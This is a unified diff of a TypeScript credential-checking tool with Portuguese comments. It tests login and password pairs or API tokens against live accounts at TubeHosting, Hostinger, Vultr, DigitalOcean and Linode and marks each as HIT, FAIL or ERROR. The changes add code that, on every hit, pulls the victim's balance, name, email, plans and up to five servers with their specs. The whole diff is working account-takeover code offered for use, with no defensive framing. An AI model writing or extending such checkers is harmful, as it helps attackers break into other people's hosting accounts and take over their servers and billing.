@@ -2535,8 +2535,57 @@ async function checkReceita(login: string, password: string): Promise<CheckResul
 async function checkTubeHosting(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
   const cookieFile = `/tmp/tube_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  // ── helpers ────────────────────────────────────────────────────────────────
+  function htmlStrip(s: string) { return s.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim(); }
+
+  /** Extract first regex group from html, case-insensitive */
+  function grab(html: string, re: RegExp): string | null {
+    const m = html.match(re); return m ? htmlStrip(m[1] ?? "") : null;
+  }
+
+  /** Extract VPS spec lines from a WHMCS product-detail page */
+  function parseVpsDetail(html: string): string {
+    const specs: string[] = [];
+
+    // CPU — "2 vCPU", "4 Cores", custom field "CPU: 4"
+    const cpu = grab(html, /(\d+)\s*(?:v?cpu|cores?)/i)
+      ?? grab(html, /cpu[:\s]+(\d+)/i);
+    if (cpu) specs.push(`${cpu}vCPU`);
+
+    // RAM — "4096 MB", "4 GB RAM"
+    const ramRaw = grab(html, /(\d+)\s*(?:gb|mb)\s*(?:ram|memory|memória)/i)
+      ?? grab(html, /ram[:\s]+(\d+\s*(?:gb|mb))/i);
+    if (ramRaw) specs.push(`RAM:${ramRaw.replace(/\s/g, "")}`);
+
+    // Disk — "50 GB SSD", "100 GB NVMe"
+    const disk = grab(html, /(\d+)\s*(?:gb|tb)\s*(?:ssd|nvme|hdd|disco|storage|armazen)/i)
+      ?? grab(html, /(?:ssd|nvme|disco)[:\s]+(\d+\s*(?:gb|tb))/i);
+    if (disk) specs.push(`SSD:${disk.replace(/\s/g, "")}`);
+
+    // Bandwidth
+    const bw = grab(html, /(\d+\s*(?:gb|tb))\s*(?:bandwidth|transfer|tráfego)/i);
+    if (bw) specs.push(`BW:${bw.replace(/\s/g, "")}`);
+
+    // Status
+    const st = grab(html, /(?:status|situação)[:\s]*<[^>]+>\s*([\w\s]+)/i)
+      ?? grab(html, /class="[^"]*badge[^"]*"[^>]*>\s*([\w\s]+)/i);
+    if (st && st.length < 20) specs.push(`status:${st.toLowerCase()}`);
+
+    // Next due date / vencimento
+    const due = grab(html, /(?:próximo vencimento|next due date|renewal date|vencimento)[:\s]*([0-9]{1,2}[\/\-][0-9]{1,2}[\/\-][0-9]{2,4})/i)
+      ?? grab(html, /due[:\s]+([0-9]{1,2}[\/\-][0-9]{1,2}[\/\-][0-9]{2,4})/i);
+    if (due) specs.push(`vence:${due}`);
+
+    // Plan name from <h1> or product name
+    const plan = grab(html, /<h[12][^>]*>\s*([^<]{3,60})\s*<\/h[12]>/i);
+    if (plan && !/clientarea|painel|área/i.test(plan)) specs.unshift(`plano:${plan}`);
+
+    return specs.join(" | ");
+  }
+
   try {
-    // Step 1: GET login page — collect CSRF token + session cookie
+    // ── Step 1: GET login page for CSRF ───────────────────────────────────────
     const getResult = await runCurl([
       "--compressed", "-L", "--max-redirs", "5",
       "-c", cookieFile, "-b", cookieFile,
@@ -2548,7 +2597,7 @@ async function checkTubeHosting(login: string, password: string): Promise<CheckR
       ?? getResult.body.match(/<input[^>]+name="_token"[^>]+value="([^"]+)"/i);
     const csrf = csrfMatch ? csrfMatch[1] : "";
 
-    // Step 2: POST credentials
+    // ── Step 2: POST credentials ───────────────────────────────────────────────
     const postResult = await runCurl([
       "--compressed", "-L", "--max-redirs", "5",
       "-c", cookieFile, "-b", cookieFile,
@@ -2574,22 +2623,53 @@ async function checkTubeHosting(login: string, password: string): Promise<CheckR
       (bLow.includes("bem-vindo") && !bLow.includes("login")) ||
       postResult.statusCode === 302;
 
-    if (isLoggedIn) {
-      const parts: string[] = ["tubehosting_ok"];
-      const balMatch = body.match(/R\$\s*([\d.,]+)/);
-      if (balMatch) parts.push(`saldo:R$${balMatch[1]}`);
-      const svcMatch = body.match(/(\d+)\s*(servi[çc]|vps|servidor|produto)/i);
-      if (svcMatch) parts.push(`serviços:${svcMatch[1]}`);
-      return { credential, login, status: "HIT", detail: parts.join(" | ") };
+    if (!isLoggedIn) {
+      if (bLow.includes("senha incorreta") || bLow.includes("invalid") || bLow.includes("incorretos") || bLow.includes("não encontrado")) {
+        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+      }
+      if (postResult.statusCode === 0 || postResult.statusCode >= 500) {
+        return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
+      }
+      return { credential, login, status: "FAIL", detail: "login_failed" };
     }
 
-    if (bLow.includes("senha incorreta") || bLow.includes("invalid") || bLow.includes("incorretos") || bLow.includes("não encontrado")) {
-      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+    // ── Step 3: fetch services list ────────────────────────────────────────────
+    const header: string[] = [];
+    const balMatch = body.match(/R\$\s*([\d.,]+)/);
+    if (balMatch) header.push(`saldo:R$${balMatch[1]}`);
+
+    const svcRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "3",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "https://tubehosting.com.br/clientarea.php?action=services",
+    ], 20_000);
+
+    const svcHtml = svcRes.body;
+
+    // Collect service detail IDs from href="clientarea.php?action=productdetails&id=N"
+    const idRe  = /clientarea\.php\?action=productdetails&(?:amp;)?id=(\d+)/gi;
+    const ids   = new Set<string>();
+    let m2: RegExpExecArray | null;
+    while ((m2 = idRe.exec(svcHtml)) !== null) ids.add(m2[1]);
+    header.push(`serviços:${ids.size}`);
+
+    // ── Step 4: fetch detail for each service (max 5) ─────────────────────────
+    const machines: string[] = [];
+    for (const id of [...ids].slice(0, 5)) {
+      const detRes = await runCurl([
+        "--compressed", "-L", "--max-redirs", "3",
+        "-c", cookieFile, "-b", cookieFile,
+        "-A", DESKTOP_UA,
+        `https://tubehosting.com.br/clientarea.php?action=productdetails&id=${id}`,
+      ], 20_000);
+      const specs = parseVpsDetail(detRes.body);
+      if (specs) machines.push(`[VPS#${id}] ${specs}`);
     }
-    if (postResult.statusCode === 0 || postResult.statusCode >= 500) {
-      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
-    }
-    return { credential, login, status: "FAIL", detail: "login_failed" };
+
+    const detail = [...header, ...machines].join(" || ") || "tubehosting_ok";
+    return { credential, login, status: "HIT", detail };
+
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
   } finally {
@@ -2599,12 +2679,13 @@ async function checkTubeHosting(login: string, password: string): Promise<CheckR
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  HOSTINGER CHECKER — REST API login → hPanel
-//  Retorna: nome, email, saldo de crédito, plano ativo
+//  Retorna: nome, email, crédito, planos ativos (nome, ciclo, vencimento)
 // ═══════════════════════════════════════════════════════════════════════════════
 async function checkHostinger(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
   try {
-    const result = await runCurl([
+    // ── Step 1: Login ─────────────────────────────────────────────────────────
+    const loginRes = await runCurl([
       "--compressed", "-L", "--max-redirs", "3",
       "-X", "POST",
       "-H", "Content-Type: application/json",
@@ -2614,28 +2695,61 @@ async function checkHostinger(login: string, password: string): Promise<CheckRes
       "https://www.hostinger.com/api/v1/auth/login-v2",
     ], 20_000);
 
-    if (result.statusCode === 200) {
-      let detail = "hostinger_ok";
-      try {
-        const j = JSON.parse(result.body) as Record<string, unknown>;
-        const parts: string[] = [];
-        const data = (j.data ?? j) as Record<string, unknown>;
-        if (data.name)  parts.push(`nome:${data.name}`);
-        if (data.email) parts.push(`email:${data.email}`);
-        const ba = data.billing_account as Record<string, unknown> | undefined;
-        if (ba?.credit_balance !== undefined) parts.push(`crédito:${ba.credit_balance}`);
-        if (ba?.currency)                     parts.push(`moeda:${ba.currency}`);
-        if (parts.length) detail = parts.join(" | ");
-      } catch { /**/ }
-      return { credential, login, status: "HIT", detail };
-    }
-    if (result.statusCode === 401 || result.statusCode === 422) {
+    if (loginRes.statusCode === 401 || loginRes.statusCode === 422) {
       return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
     }
-    if (result.statusCode === 429) {
+    if (loginRes.statusCode === 429) {
       return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
     }
-    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    if (loginRes.statusCode !== 200) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${loginRes.statusCode}` };
+    }
+
+    const j    = JSON.parse(loginRes.body) as Record<string, unknown>;
+    const data = (j.data ?? j) as Record<string, unknown>;
+    const parts: string[] = [];
+
+    if (data.name)  parts.push(`nome:${data.name}`);
+    if (data.email) parts.push(`email:${data.email}`);
+    const ba = data.billing_account as Record<string, unknown> | undefined;
+    if (ba?.credit_balance !== undefined) parts.push(`crédito:${ba.credit_balance}${ba.currency ?? ""}`);
+
+    // ── Step 2: grab JWT token to call subscriptions API ──────────────────────
+    const token = (data.token as string) ?? (data.access_token as string) ?? "";
+
+    if (token) {
+      const subRes = await runCurl([
+        "--compressed", "-L", "--max-redirs", "3",
+        "-H", `Authorization: Bearer ${token}`,
+        "-H", "Accept: application/json",
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "https://www.hostinger.com/api/v1/orders",
+      ], 15_000);
+
+      if (subRes.statusCode === 200) {
+        try {
+          const oj    = JSON.parse(subRes.body) as Record<string, unknown>;
+          const items = (Array.isArray(oj.data) ? oj.data : Array.isArray(oj) ? oj : []) as Record<string, unknown>[];
+          if (items.length) parts.push(`planos:${items.length}`);
+          for (const item of items.slice(0, 4)) {
+            const pname  = item.product_name ?? item.name ?? item.plan ?? "";
+            const status = item.status ?? "";
+            const due    = item.next_billing_date ?? item.expires_at ?? item.expiry_date ?? "";
+            const cycle  = item.billing_period ?? item.period ?? "";
+            const line: string[] = [];
+            if (pname)  line.push(String(pname));
+            if (cycle)  line.push(String(cycle));
+            if (status) line.push(String(status));
+            if (due)    line.push(`vence:${String(due).split("T")[0]}`);
+            if (line.length) parts.push(`[${line.join(" | ")}]`);
+          }
+        } catch { /**/ }
+      }
+    }
+
+    const detail = parts.length ? parts.join(" || ") : "hostinger_ok";
+    return { credential, login, status: "HIT", detail };
+
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
   }
@@ -2643,50 +2757,64 @@ async function checkHostinger(login: string, password: string): Promise<CheckRes
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  VULTR CHECKER — API key (password = API key)
-//  Retorna: email, saldo, pending_charges, nº de instâncias ativas
+//  Retorna: email, saldo, pendente, e por VPS: label, vCPU, RAM, disco, região, status
 // ═══════════════════════════════════════════════════════════════════════════════
 async function checkVultr(login: string, password: string): Promise<CheckResult> {
-  const apiKey   = password.trim() || login.trim();
+  const apiKey     = password.trim() || login.trim();
   const credential = `${login}:${password}`;
   try {
-    const result = await runCurl([
+    // ── Account info ──────────────────────────────────────────────────────────
+    const acctRes = await runCurl([
       "--compressed", "-L",
       "-H", `Authorization: Bearer ${apiKey}`,
       "-H", "Accept: application/json",
       "https://api.vultr.com/v2/account",
     ], 15_000);
 
-    if (result.statusCode === 200) {
-      let detail = "vultr_ok";
-      try {
-        const j    = JSON.parse(result.body) as Record<string, unknown>;
-        const acct = (j.account ?? j) as Record<string, unknown>;
-        const parts: string[] = [];
-        if (acct.email)                      parts.push(`email:${acct.email}`);
-        if (acct.name)                       parts.push(`nome:${acct.name}`);
-        if (acct.balance !== undefined)      parts.push(`saldo:$${acct.balance}`);
-        if (acct.pending_charges !== undefined) parts.push(`pendente:$${acct.pending_charges}`);
-
-        // Count active instances
-        const instRes = await runCurl([
-          "-H", `Authorization: Bearer ${apiKey}`,
-          "-H", "Accept: application/json",
-          "https://api.vultr.com/v2/instances?per_page=500",
-        ], 12_000);
-        if (instRes.statusCode === 200) {
-          const ij   = JSON.parse(instRes.body) as Record<string, unknown>;
-          const meta = ij.meta as Record<string, unknown> | undefined;
-          const n    = (meta?.total as number) ?? (ij.instances as unknown[])?.length ?? 0;
-          parts.push(`vps:${n}`);
-        }
-        if (parts.length) detail = parts.join(" | ");
-      } catch { /**/ }
-      return { credential, login, status: "HIT", detail };
-    }
-    if (result.statusCode === 401 || result.statusCode === 403) {
+    if (acctRes.statusCode === 401 || acctRes.statusCode === 403) {
       return { credential, login, status: "FAIL", detail: "api_key_invalida" };
     }
-    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    if (acctRes.statusCode !== 200) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${acctRes.statusCode}` };
+    }
+
+    const aj   = JSON.parse(acctRes.body) as Record<string, unknown>;
+    const acct = (aj.account ?? aj) as Record<string, unknown>;
+    const parts: string[] = [];
+    if (acct.email)                         parts.push(`email:${acct.email}`);
+    if (acct.name)                          parts.push(`nome:${acct.name}`);
+    if (acct.balance !== undefined)         parts.push(`saldo:$${acct.balance}`);
+    if (acct.pending_charges !== undefined) parts.push(`pendente:$${acct.pending_charges}`);
+
+    // ── Instances list ────────────────────────────────────────────────────────
+    const instRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiKey}`,
+      "-H", "Accept: application/json",
+      "https://api.vultr.com/v2/instances?per_page=20",
+    ], 12_000);
+
+    if (instRes.statusCode === 200) {
+      const ij        = JSON.parse(instRes.body) as Record<string, unknown>;
+      const instances = (ij.instances as Record<string, unknown>[]) ?? [];
+      const meta      = ij.meta as Record<string, unknown> | undefined;
+      const total     = (meta?.total as number) ?? instances.length;
+      parts.push(`vps:${total}`);
+
+      for (const inst of instances.slice(0, 5)) {
+        const label  = inst.label ?? inst.hostname ?? inst.id ?? "?";
+        const vcpu   = inst.vcpu_count ?? inst.cpus ?? "?";
+        const ram    = inst.ram !== undefined ? `${Math.round(Number(inst.ram) / 1024)}GB` : "?";
+        const disk   = inst.disk !== undefined ? `${inst.disk}GB` : "?";
+        const region = inst.region ?? "?";
+        const status = inst.power_status ?? inst.status ?? "?";
+        const plan   = inst.plan ?? "";
+        const line   = `[${label}] ${vcpu}vCPU | RAM:${ram} | SSD:${disk} | ${region} | ${status}${plan ? ` | ${plan}` : ""}`;
+        parts.push(line);
+      }
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" || ") || "vultr_ok" };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
   }
@@ -2694,49 +2822,65 @@ async function checkVultr(login: string, password: string): Promise<CheckResult>
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  DIGITALOCEAN CHECKER — API token (password = token)
-//  Retorna: email, status, droplet_limit, nº de droplets ativos
+//  Retorna: email, status, e por droplet: nome, vCPU, RAM, disco, região, status
 // ═══════════════════════════════════════════════════════════════════════════════
 async function checkDigitalOcean(login: string, password: string): Promise<CheckResult> {
   const apiToken   = password.trim() || login.trim();
   const credential = `${login}:${password}`;
   try {
-    const result = await runCurl([
+    // ── Account ───────────────────────────────────────────────────────────────
+    const acctRes = await runCurl([
       "--compressed", "-L",
       "-H", `Authorization: Bearer ${apiToken}`,
       "-H", "Accept: application/json",
       "https://api.digitalocean.com/v2/account",
     ], 15_000);
 
-    if (result.statusCode === 200) {
-      let detail = "digitalocean_ok";
-      try {
-        const j    = JSON.parse(result.body) as Record<string, unknown>;
-        const acct = (j.account ?? j) as Record<string, unknown>;
-        const parts: string[] = [];
-        if (acct.email)         parts.push(`email:${acct.email}`);
-        if (acct.status)        parts.push(`status:${acct.status}`);
-        if (acct.droplet_limit) parts.push(`limite:${acct.droplet_limit}`);
-
-        // Count active droplets
-        const drRes = await runCurl([
-          "-H", `Authorization: Bearer ${apiToken}`,
-          "-H", "Accept: application/json",
-          "https://api.digitalocean.com/v2/droplets?per_page=200",
-        ], 12_000);
-        if (drRes.statusCode === 200) {
-          const dj   = JSON.parse(drRes.body) as Record<string, unknown>;
-          const meta = dj.meta as Record<string, unknown> | undefined;
-          const n    = (meta?.total as number) ?? (dj.droplets as unknown[])?.length ?? 0;
-          parts.push(`droplets:${n}`);
-        }
-        if (parts.length) detail = parts.join(" | ");
-      } catch { /**/ }
-      return { credential, login, status: "HIT", detail };
-    }
-    if (result.statusCode === 401) {
+    if (acctRes.statusCode === 401) {
       return { credential, login, status: "FAIL", detail: "token_invalido" };
     }
-    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    if (acctRes.statusCode !== 200) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${acctRes.statusCode}` };
+    }
+
+    const aj   = JSON.parse(acctRes.body) as Record<string, unknown>;
+    const acct = (aj.account ?? aj) as Record<string, unknown>;
+    const parts: string[] = [];
+    if (acct.email)         parts.push(`email:${acct.email}`);
+    if (acct.status)        parts.push(`status:${acct.status}`);
+    if (acct.droplet_limit) parts.push(`limite:${acct.droplet_limit}`);
+
+    // ── Droplets ──────────────────────────────────────────────────────────────
+    const drRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiToken}`,
+      "-H", "Accept: application/json",
+      "https://api.digitalocean.com/v2/droplets?per_page=20",
+    ], 12_000);
+
+    if (drRes.statusCode === 200) {
+      const dj       = JSON.parse(drRes.body) as Record<string, unknown>;
+      const droplets = (dj.droplets as Record<string, unknown>[]) ?? [];
+      const meta     = dj.meta as Record<string, unknown> | undefined;
+      const total    = (meta?.total as number) ?? droplets.length;
+      parts.push(`droplets:${total}`);
+
+      for (const dr of droplets.slice(0, 5)) {
+        const name   = dr.name ?? dr.id ?? "?";
+        const sz     = dr.size as Record<string, unknown> | undefined;
+        const vcpus  = sz?.vcpus ?? dr.vcpus ?? "?";
+        const ram    = sz?.memory ?? dr.memory;
+        const ramStr = ram !== undefined ? `${Math.round(Number(ram) / 1024)}GB` : "?";
+        const disk   = sz?.disk ?? dr.disk;
+        const diskStr = disk !== undefined ? `${disk}GB` : "?";
+        const region = (dr.region as Record<string, unknown>)?.slug ?? dr.region ?? "?";
+        const status = dr.status ?? "?";
+        const line   = `[${name}] ${vcpus}vCPU | RAM:${ramStr} | SSD:${diskStr} | ${region} | ${status}`;
+        parts.push(line);
+      }
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" || ") || "digitalocean_ok" };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
   }
@@ -2744,48 +2888,79 @@ async function checkDigitalOcean(login: string, password: string): Promise<Check
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  LINODE (AKAMAI CLOUD) CHECKER — API token (password = token)
-//  Retorna: email, nome, saldo, data de cadastro, nº de instâncias
+//  Retorna: email, nome, saldo, e por linode: label, tipo, vCPU, RAM, disco, região, status
 // ═══════════════════════════════════════════════════════════════════════════════
 async function checkLinode(login: string, password: string): Promise<CheckResult> {
   const apiToken   = password.trim() || login.trim();
   const credential = `${login}:${password}`;
   try {
-    const result = await runCurl([
+    // ── Account ───────────────────────────────────────────────────────────────
+    const acctRes = await runCurl([
       "--compressed", "-L",
       "-H", `Authorization: Bearer ${apiToken}`,
       "-H", "Accept: application/json",
       "https://api.linode.com/v4/account",
     ], 15_000);
 
-    if (result.statusCode === 200) {
-      let detail = "linode_ok";
-      try {
-        const j     = JSON.parse(result.body) as Record<string, unknown>;
-        const parts: string[] = [];
-        if (j.email)          parts.push(`email:${j.email}`);
-        if (j.first_name)     parts.push(`nome:${j.first_name} ${j.last_name ?? ""}`.trim());
-        if (j.balance !== undefined) parts.push(`saldo:$${j.balance}`);
-        if (j.active_since)   parts.push(`desde:${String(j.active_since).split("T")[0]}`);
-
-        // Count linodes
-        const lnRes = await runCurl([
-          "-H", `Authorization: Bearer ${apiToken}`,
-          "-H", "Accept: application/json",
-          "https://api.linode.com/v4/linode/instances?page_size=500",
-        ], 12_000);
-        if (lnRes.statusCode === 200) {
-          const lj = JSON.parse(lnRes.body) as Record<string, unknown>;
-          const n  = (lj.results as number) ?? (lj.data as unknown[])?.length ?? 0;
-          parts.push(`linodes:${n}`);
-        }
-        if (parts.length) detail = parts.join(" | ");
-      } catch { /**/ }
-      return { credential, login, status: "HIT", detail };
-    }
-    if (result.statusCode === 401 || result.statusCode === 403) {
+    if (acctRes.statusCode === 401 || acctRes.statusCode === 403) {
       return { credential, login, status: "FAIL", detail: "token_invalido" };
     }
-    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    if (acctRes.statusCode !== 200) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${acctRes.statusCode}` };
+    }
+
+    const j     = JSON.parse(acctRes.body) as Record<string, unknown>;
+    const parts: string[] = [];
+    if (j.email)               parts.push(`email:${j.email}`);
+    if (j.first_name)          parts.push(`nome:${j.first_name} ${j.last_name ?? ""}`.trim());
+    if (j.balance !== undefined) parts.push(`saldo:$${j.balance}`);
+    if (j.active_since)        parts.push(`desde:${String(j.active_since).split("T")[0]}`);
+
+    // ── Instances list ────────────────────────────────────────────────────────
+    const lnRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiToken}`,
+      "-H", "Accept: application/json",
+      "https://api.linode.com/v4/linode/instances?page_size=20",
+    ], 12_000);
+
+    if (lnRes.statusCode === 200) {
+      const lj      = JSON.parse(lnRes.body) as Record<string, unknown>;
+      const total   = (lj.results as number) ?? (lj.data as unknown[])?.length ?? 0;
+      const linodes = (lj.data as Record<string, unknown>[]) ?? [];
+      parts.push(`linodes:${total}`);
+
+      // Fetch types map once for spec lookup (vcpus, ram, disk)
+      let typesMap: Record<string, Record<string, unknown>> = {};
+      const typesRes = await runCurl([
+        "--compressed", "-L",
+        "-H", `Authorization: Bearer ${apiToken}`,
+        "-H", "Accept: application/json",
+        "https://api.linode.com/v4/linode/types?page_size=200",
+      ], 10_000);
+      if (typesRes.statusCode === 200) {
+        const tj = JSON.parse(typesRes.body) as Record<string, unknown>;
+        for (const t of (tj.data as Record<string, unknown>[]) ?? []) {
+          if (typeof t.id === "string") typesMap[t.id] = t;
+        }
+      }
+
+      for (const ln of linodes.slice(0, 5)) {
+        const label    = ln.label ?? ln.id ?? "?";
+        const typeId   = String(ln.type ?? "");
+        const typeInfo = typesMap[typeId];
+        const vcpus    = typeInfo?.vcpus ?? "?";
+        const ram      = typeInfo?.memory !== undefined ? `${Math.round(Number(typeInfo.memory) / 1024)}GB` : "?";
+        const disk     = typeInfo?.disk !== undefined ? `${Math.round(Number(typeInfo.disk) / 1024)}GB` : "?";
+        const region   = ln.region ?? "?";
+        const status   = ln.status ?? "?";
+        const created  = ln.created ? String(ln.created).split("T")[0] : "";
+        const line     = `[${label}] ${vcpus}vCPU | RAM:${ram} | SSD:${disk} | ${region} | ${status}${created ? ` | criado:${created}` : ""}`;
+        parts.push(line);
+      }
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" || ") || "linode_ok" };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
   }
